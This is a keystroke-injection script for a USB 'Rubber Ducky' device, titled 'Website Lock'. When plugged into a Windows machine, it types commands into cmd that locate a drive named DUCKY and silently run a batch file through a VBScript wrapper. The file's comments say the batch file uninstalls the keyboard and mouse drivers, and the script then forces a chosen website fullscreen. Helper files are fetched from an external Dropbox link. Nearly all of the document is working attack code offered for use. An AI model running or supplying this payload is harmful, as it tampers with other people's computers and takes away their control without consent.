layout('es');                   // Spanish keyboard layout
typingSpeed(100,150)    // Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)

// Title: Website Lock
// Author: Ernest & Isaac
// Target Ducky Encoder: 2.6.2
// Target OS: Windows 7 (32 and 64 bit), maybe older/newer windows versions. Haven't tested it on any other than 7.
// Description: Plays off of Aprizm's script to open a website, but it also disables the mouse and keyboard so the user can't leave the website.
// Info:
//     The user can easily unplug and re-plug in the keyboard/mouse to reinstall the drivers get them working again.
//     This requires the user to plug a USB drive in BEFORE the ducky is plugged in.
//     The files are here: https://www.dropbox.com/sh/i09leu4kcifta6a/AACEFYQnlOIUsDtLLrQuemCha?dl=0.
//     Make sure the files are in the root of a drive called DUCKY.
//     Twin duck works well with this. It is what I used when I was testing it.
// File Descriptions:
//     The devcon32 & devcon64 are the files used to uninstall the keyboard and mouse drivers (for the two architectures).
//     The invisible.vbs is used to run the batch script invisibly after the video is in fullscreen.
//     The TheRealAnnoyance.bat is the batch script run in the background that disables their mouse & keyboard.
//     The WebsiteLink.txt contains the website link. The user can change this as desired. Make sure there are no spaces and there is only a single link.
//     If you are going to modify the website link as a youtube video, it needs to be in this format: https://www.youtube.com/embed/sCNrK-n68CM?rel=0&autoplay=1&loop=1
//     Find the youtube video you want, then take the part after watch?v= and put it in place of sCNrK-n68CM in the above link.
delay(3000)
press("GUI r")
delay(70)
type("cmd")
delay(3000)
delay(700)
type("for /f %d in ('wmic.exe volume get driveletter^, label ^| findstr "DUCKY"') do set myd=%d")
press("ENTER")
delay(1200)
type("cd /d %myd%")
press("ENTER")
delay(1000)
type("type "WebsiteLink.txt" | clip")
press("ENTER")
delay(100)
type("C:/windows/System32/wscript.exe invisible.vbs TheRealAnnoyance.bat")
press("ENTER")
delay(400)
delay(200)
press("GUI r")
delay(200)
press("ENTER")
delay(1000)
press("F11")
